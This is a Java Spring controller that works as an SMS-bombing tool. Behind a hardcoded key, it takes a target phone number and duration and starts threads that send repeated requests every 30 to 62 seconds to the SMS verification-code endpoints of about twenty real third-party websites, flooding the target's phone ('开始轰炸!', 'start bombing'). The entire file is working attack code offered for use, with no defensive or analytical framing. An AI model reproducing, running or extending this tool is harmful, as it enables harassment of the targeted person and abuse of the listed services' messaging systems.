package com.liang.controller;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.servlet.http.HttpServletRequest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RestController;
import com.liang.VO.ResultVO;
import com.liang.util.ResultVOUtil;

@RestController
public class UserController {
	
	public static SMSThread60 smsThread60;
	public static SMSThread smsThread;
	public static TimeOutThread timeOutThread;
	
	public static String number = "10086";
	
	public static Boolean sendState = false;
	
	protected static final Logger logger = LoggerFactory.getLogger(UserController.class);
	 
	@PostMapping("sendMsm")
	public ResultVO sendMsm(String uphone,Integer min,String key,HttpServletRequest request) {
		if(uphone == null || uphone.equals("")) {
			return ResultVOUtil.error(404, "手机号不能为空!");
		} else if(min == null || min == 0){
			return ResultVOUtil.error(404, "时间不能为0!");
		}else if(key != null && key.equals("214214214")) {
			try {
				number = uphone;
				sendState = true;
				timeOutThread = new TimeOutThread(min);
				smsThread60 = new SMSThread60();
				smsThread = new SMSThread();
				timeOutThread.start();//启动倒计时
				smsThread60.start();//启动60秒限制线程
				smsThread.start();//启动无限制线程--使用30秒一次
			}catch(Exception e) {
				logger.info(e+"");
			}
			return ResultVOUtil.success("开始轰炸!");
		}else {
			return ResultVOUtil.error(500, "密钥错误!");
		}
	}
	
	@GetMapping("stopSend")
	public ResultVO stopSend(HttpServletRequest request) {
		try {
			logger.info("smsThread60 存活:" +smsThread60.isAlive()+" 状态:" + smsThread60.getState());
			logger.info("smsThread 存活:" +smsThread.isAlive()+" 状态:" + smsThread.getState());
			logger.info("timeOutThread 存活:" +timeOutThread.isAlive()+" 状态:" + timeOutThread.getState());
			if(smsThread60.isAlive() == true || smsThread.isAlive() == true) {
				sendState = false;
				return ResultVOUtil.success("停止成功!");
			}else {
				return ResultVOUtil.success("无任务!");
			}
		} catch (Exception e) {
			logger.info(e+"");
			return ResultVOUtil.success("无任务!");
		}
		
	}
	
	
	public static class TimeOutThread extends Thread{
		Integer min;
		public TimeOutThread(Integer _min) {
			this.min = _min;
		}
		@Override
		public void run() {
			try {
				min = min * 60;
				while(sendState) {
					if(min <= 0) {
						sendState = false;
						sleep(10000);
						logger.info("smsThread60 存活:" +smsThread60.isAlive()+" 状态:" + smsThread60.getState());
						logger.info("smsThread 存活:" +smsThread.isAlive()+" 状态:" + smsThread.getState());
						break;
					}
					min = min - 1;
					sleep(1000);
				}
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

	public static class SMSThread60 extends Thread {
		@Override
		public void run() {
			
			while(sendState){
				logger.info("60s");
					
					try {
						logger.info(number+" = https://id.app.acfun.cn = "+requestPOSTUtil("https://id.app.acfun.cn/rest/web/login/sms/send","mobile="+number+"&type=6&"));
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://www1.joyowo.com = "+requestPOSTUtil("https://www1.joyowo.com/nodecaptcha/sendregcode/","phone="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://passport.qiyuesuo.com = "+requestPOSTUtil("https://passport.qiyuesuo.com/signup/pin","username="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://www.compassedu.hk = "+requestPOSTUtil("https://www.compassedu.hk/mainvlt_send","mobile="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://accounts.yiqifei.com = "+requestPOSTUtil("https://accounts.yiqifei.com/Passport/CreateDynamicPassword","phoneNumber="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://www.jzxs.com = "+requestPOSTUtil("https://www.jzxs.com/lk/alidayu/","phone="+number+"&t=register&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = http://aibookchina.com = "+requestPOSTUtil("http://aibookchina.com/home/Register/sendSms","phone="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://www.gezila.com = "+requestPOSTUtil("https://www.gezila.com/member/code_sms.php","moblie="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://www.yunzhixiyou.com = "+requestPOSTUtil("https://www.yunzhixiyou.com/api/user/register/validationMobile","mobileNumber="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://tgbus-api.xy.huijitrans.com = "+requestPOSTUtil("https://tgbus-api.xy.huijitrans.com/api/user/code","mobile="+number+"&type=0&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://auth.sonkwo.com = "+requestPOSTUtil("https://auth.sonkwo.com/api/message.json?locale=js","sonkwo_version=1&sonkwo_client=web&message[number]="+number+"&message[kind]=regist&message[type]=Sms"));//时间限制60秒，频繁操作会导致400错误
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://api2.quhepai.com = "+requestPOSTUtil("https://api2.quhepai.com/user/getsmscode","os=Android&model=SM-G930F&area_id=110000&rctk=&imei=865821079483270&hpid=&ver=1.6.9&long=106.67963615746643&build=1712211344&token_temp=&netk=&nonce=1515146882410&token=&sa=SvWDOSgflCTktWN2gZJeA26s%2FKsJfvkYUf3h8KsEJ%2FxBUE3KOW%2BlQWy3g9bqRlNZ0EYGzUKwOb%2F0%0AYgOREoKTl3mmqa2pcsblrYUDbkDcT8dQiWJ9VxTaKqeIEbVl38VE4rXB1avYbPR2zOkD28c7%2Fas%2F%0Ap0R38lq3nziMVHRap34%3D&company=samsung&logined=0&api=39&verCode=446&user_id=&ch=hepai_s_018&lat=26.636185489185326&type=1&phone="+number+"&"));////时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://ares.xiaohongshu.com = "+doGet("https://ares.xiaohongshu.com/api/eros/login/mobile/sendCode?mobile="+number+"&zone=86"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://www.jtgloble.com = "+requestPOSTUtil("https://www.jtgloble.com/sms/sms.php?act=send","mobile="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = https://usercenter.chinadaily.com.cn = "+requestPOSTUtil("https://usercenter.chinadaily.com.cn/regist/getPhoneValidateCode","phonenum="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					
					//成功率低会中断，放到最后
					try {
					logger.info(number+" = http://www.heiguang.com = "+requestPOSTUtil("http://www.heiguang.com/index.php?m=member&c=site&a=public_send_sms","mobile="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
					try {
					logger.info(number+" = http://newsso.forex.com.cn = "+requestPOSTUtil("http://newsso.forex.com.cn/ssouser/sendPhoneRegisterValicode.do","phone="+number+"&"));//时间限制60秒
					} catch (Exception e) {logger.info(e+"");}//时间限制60秒
					
				try {sleep(62000);} catch (InterruptedException e1) {logger.info(e1+"");}
			}
			logger.info("60s的线程结束");
		}
	}
		
	public static class SMSThread extends Thread {
			@Override
			public void run() {
				
				while(sendState){
					logger.info("30s");	
					
						try {
						logger.info(number+" = http://ps.p5w.net = "+requestPOSTUtil("http://ps.p5w.net/mobile/verifyCode/0","mb="+number+"&"));//无时间限制
						} catch (Exception e) {logger.info(e+"");}//时间限制60秒
						
						try {
						logger.info(number+" = https://trade.rtfund.com = "+requestPOSTUtil("https://trade.rtfund.com/etrading/page/openAcct/openGetValidatecode.do","param.mobileno="+number+"&"));//无时间限制
						} catch (Exception e) {logger.info(e+"");}//时间限制60秒
						
						try {
						logger.info(number+" = http://gd.10086.cn = "+requestPOSTUtil("http://gd.10086.cn/easy/product/order/getValidateRndCode.jsps","mobile="+number+"&commCode=LLKC300&merchantCode=GD"));//无时间限制
						} catch (Exception e) {logger.info(e+"");}//时间限制60秒
						
						try {
						logger.info(number+" = http://www.hqbzs.cn = "+requestPOSTUtil("http://www.hqbzs.cn/f/idx/getCode","mobile="+number+"&type=1"));//无限制时间
						} catch (Exception e) {logger.info(e+"");}//时间限制60秒
						
					try {sleep(30000);} catch (InterruptedException e1) {logger.info(e1+"");}
				}
				logger.info("30s的线程结束");
			}
	}
	
	public static String requestPOSTUtil(String url,String query) throws Exception
    {
        URL restURL = new URL(url);
        /*
         * 此处的urlConnection对象实际上是根据URL的请求协议(此处是http)生成的URLConnection类 的子类HttpURLConnection
         */
        HttpURLConnection conn = (HttpURLConnection) restURL.openConnection();
        //请求方式
        conn.setRequestMethod("POST");
        //设置是否从httpUrlConnection读入，默认情况下是true; httpUrlConnection.setDoInput(true);
        conn.setDoOutput(true);
        //allowUserInteraction 如果为 true，则在允许用户交互（例如弹出一个验证对话框）的上下文中对此 URL 进行检查。
        conn.setAllowUserInteraction(false);

        PrintStream ps = new PrintStream(conn.getOutputStream());
        ps.print(query);

        ps.close();

        BufferedReader bReader = new BufferedReader(new InputStreamReader(conn.getInputStream()));

        String line,resultStr="";

        while(null != (line=bReader.readLine()))
        {
        resultStr +=line;
        }
        bReader.close();

        return resultStr;

    }
	/**
	 * java query string parameters GET请求
	 * @param httpurl
	 * @return
	 */
	public static String doGet(String httpurl) {
        HttpURLConnection connection = null;
        InputStream is = null;
        BufferedReader br = null;
        String result = null;// 返回结果字符串
        try {
            // 创建远程url连接对象
            URL url = new URL(httpurl);
            // 通过远程url连接对象打开一个连接，强转成httpURLConnection类
            connection = (HttpURLConnection) url.openConnection();
            // 设置连接方式：get
            connection.setRequestMethod("GET");
            // 设置连接主机服务器的超时时间：15000毫秒
            connection.setConnectTimeout(15000);
            // 设置读取远程返回的数据时间：60000毫秒
            connection.setReadTimeout(60000);
            // 发送请求
            connection.connect();
            // 通过connection连接，获取输入流
            if (connection.getResponseCode() == 200) {
                is = connection.getInputStream();
                // 封装输入流is，并指定字符集
                br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                // 存放数据
                StringBuffer sbf = new StringBuffer();
                String temp = null;
                while ((temp = br.readLine()) != null) {
                    sbf.append(temp);
                    sbf.append("\r\n");
                }
                result = sbf.toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // 关闭资源
            if (null != br) {
                try {
                    br.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
 
            if (null != is) {
                try {
                    is.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
 
            connection.disconnect();// 关闭远程连接
        }
 
        return result;
    }
	
   	
}
